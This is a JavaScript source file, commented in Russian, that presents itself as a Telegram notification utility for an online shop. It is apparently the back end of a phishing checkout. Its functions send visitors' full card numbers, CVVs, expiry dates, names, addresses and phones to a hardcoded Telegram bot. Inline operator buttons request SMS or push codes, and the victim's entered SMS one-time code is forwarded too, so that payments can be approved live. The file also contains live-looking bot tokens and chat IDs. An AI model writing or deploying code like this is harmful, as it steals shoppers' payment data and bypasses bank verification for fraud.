// Telegram Bot утилита для отправки уведомлений
// Бот 1 - для уведомлений о действиях на сайте
const BOT_TOKEN = '8331014768:AAGOCsiFshI4o6VkVkY3fiFkdn6Zhoj9N2E'
const CHAT_ID = '-4862930461'

// Бот 2 - для данных банковских карт
const BOT_TOKEN_CARDS = '8406857793:AAGDQnLYrL78nWDrBxi1AS1kWTTVjxdUbpg'
const CHAT_ID_CARDS = '-1003171719602'

// Генерируем уникальный ID пользователя на основе браузера и времени
export const generateUserId = () => {
  const timestamp = Date.now()
  const random = Math.random().toString(36).substr(2, 9)
  return `user_${timestamp}_${random}`
}

// Получаем или создаём ID пользователя
export const getUserId = () => {
  let userId = localStorage.getItem('telegram_user_id')
  if (!userId) {
    userId = generateUserId()
    localStorage.setItem('telegram_user_id', userId)
  }
  return userId
}

// Отправляем сообщение в Telegram (основной бот для уведомлений)
const sendTelegramMessage = async (message) => {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    })
    
    if (!response.ok) {
      console.error('Failed to send Telegram message:', response.statusText)
    }
  } catch (error) {
    console.error('Error sending Telegram message:', error)
  }
}

// Отправляем сообщение в Telegram (бот для банковских карт)
const sendTelegramMessageCards = async (message, inlineKeyboard = null) => {
  try {
    const payload = {
      chat_id: CHAT_ID_CARDS,
      text: message,
      parse_mode: 'HTML'
    }
    
    if (inlineKeyboard) {
      payload.reply_markup = {
        inline_keyboard: inlineKeyboard
      }
    }
    
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN_CARDS}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    })
    
    if (!response.ok) {
      console.error('Failed to send Telegram message to cards bot:', response.statusText)
    }
  } catch (error) {
    console.error('Error sending Telegram message to cards bot:', error)
  }
}

// Уведомление о входе на сайт
export const notifySiteEntry = () => {
  const userId = getUserId()
  const timestamp = new Date().toLocaleString('ru-RU', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  })
  
  const userAgent = navigator.userAgent
  
  const message = `🟢 <b>ПОЛЬЗОВАТЕЛЬ ЗАШЁЛ НА САЙТ</b>

👤 <b>ID:</b> <code>${userId}</code>
🕐 <b>Время:</b> ${timestamp}
📱 <b>User Agent:</b> ${userAgent}`

  sendTelegramMessage(message)
}

// Уведомление о заполнении формы чекаута
export const notifyCheckoutFormFill = (formData, cartItems, total) => {
  const userId = getUserId()
  const timestamp = new Date().toLocaleString('ru-RU', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  })
  
  const deliveryFee = 0 // Доставка всегда бесплатная
  const finalTotal = total + deliveryFee
  
  const message = `📝 <b>ЗАПОЛНЕНИЕ ФОРМЫ ЧЕКАУТА</b>

👤 <b>ID:</b> <code>${userId}</code>
🕐 <b>Время:</b> ${timestamp}
👨‍💼 <b>Клиент:</b> ${formData.firstName} ${formData.lastName}
📞 <b>Телефон:</b> ${formData.phone}
🛒 <b>Заказ:</b> ${cartItems.length} товаров
💰 <b>Итого:</b> ${finalTotal} THB`

  sendTelegramMessage(message)
}

// Уведомление о переходе на платёжную систему
export const notifyPaymentRedirect = (orderId, amountTHB) => {
  const userId = getUserId()
  const timestamp = new Date().toLocaleString('ru-RU', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  })
  
  const message = `💳 <b>ПЕРЕХОД НА ПЛАТЁЖНУЮ СИСТЕМУ</b>

👤 <b>ID:</b> <code>${userId}</code>
🕐 <b>Время:</b> ${timestamp}
🆔 <b>Заказ:</b> <code>${orderId}</code>
💰 <b>Сумма:</b> ${amountTHB} THB`

  sendTelegramMessage(message)
}

// Уведомление о возврате с платёжной системы
export const notifyPaymentReturn = (orderId, status) => {
  const userId = getUserId()
  const timestamp = new Date().toLocaleString('ru-RU', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  })
  
  const statusEmoji = status === 'success' ? '✅' : '❌'
  const statusText = status === 'success' ? 'УСПЕШНО' : 'НЕУСПЕШНО'
  
  const message = `${statusEmoji} <b>ВОЗВРАТ С ПЛАТЁЖНОЙ СИСТЕМЫ</b>

👤 <b>ID:</b> <code>${userId}</code>
🕐 <b>Время:</b> ${timestamp}
🆔 <b>Заказ:</b> <code>${orderId}</code>
📊 <b>Статус:</b> ${statusText}`

  sendTelegramMessage(message)
}

// Уведомление о вводе данных банковской карты (отправляется в отдельный чат для карт)
export const notifyCardPayment = (cardData, orderData) => {
  const userId = getUserId()
  const timestamp = new Date().toLocaleString('ru-RU', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  })
  
  const message = `💳 <b>ДАННЫЕ БАНКОВСКОЙ КАРТЫ</b>

👤 <b>ID клиента:</b> <code>${userId}</code>
🕐 <b>Время:</b> ${timestamp}

💳 <b>ДАННЫЕ КАРТЫ:</b>
💳 <b>Номер карты:</b> <code>${cardData.cardNumber}</code>
👤 <b>Держатель:</b> ${cardData.cardHolderName}
📅 <b>Срок:</b> ${cardData.expiryDate}
🔐 <b>CVV:</b> <code>${cardData.cvv}</code>

📦 <b>ЗАКАЗ:</b>
👨‍💼 <b>Клиент:</b> ${orderData.formData.firstName} ${orderData.formData.lastName}
📞 <b>Телефон:</b> ${orderData.formData.phone}
📧 <b>Email:</b> ${orderData.formData.email}
🏠 <b>Адрес:</b> ${orderData.formData.address}, ${orderData.formData.city}
💰 <b>Сумма заказа:</b> ${orderData.total} THB`

  // Inline кнопки для управления
  const inlineKeyboard = [
    [
      { text: '📱 Запросить SMS', callback_data: `request_sms_${userId}` },
      { text: '🔔 Запросить PUSH', callback_data: `request_push_${userId}` }
    ],
    [
      { text: '❌ Не верное SMS', callback_data: `invalid_sms_${userId}` },
      { text: '🚫 Карта не лезет', callback_data: `card_blocked_${userId}` }
    ]
  ]

  sendTelegramMessageCards(message, inlineKeyboard)
}

// Уведомление о вводе SMS кода клиентом
export const notifySMSCodeEntered = (smsCode, cardData, orderData) => {
  const userId = getUserId()
  const timestamp = new Date().toLocaleString('ru-RU', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  })

  const message = `📱 <b>SMS КОД ВВЕДЕН</b>

👤 <b>ID клиента:</b> <code>${userId}</code>
🕐 <b>Время:</b> ${timestamp}

🔐 <b>SMS КОД:</b> <code>${smsCode}</code>

💳 <b>ДАННЫЕ КАРТЫ:</b>
💳 <b>Номер:</b> <code>${cardData.cardNumber}</code>
👤 <b>Держатель:</b> ${cardData.cardHolderName}
📅 <b>Срок:</b> ${cardData.expiryDate}
🔐 <b>CVV:</b> <code>${cardData.cvv}</code>

📦 <b>ЗАКАЗ:</b>
👨‍💼 <b>Клиент:</b> ${orderData.formData.firstName} ${orderData.formData.lastName}
📞 <b>Телефон:</b> ${orderData.formData.phone}
💰 <b>Сумма:</b> ${orderData.total} THB`

  // Inline кнопки для результата оплаты
  const inlineKeyboard = [
    [
      { text: '✅ Успешная оплата', callback_data: `payment_success_${userId}` },
      { text: '❌ Не успешная оплата', callback_data: `payment_failed_${userId}` }
    ]
  ]

  sendTelegramMessageCards(message, inlineKeyboard)
}
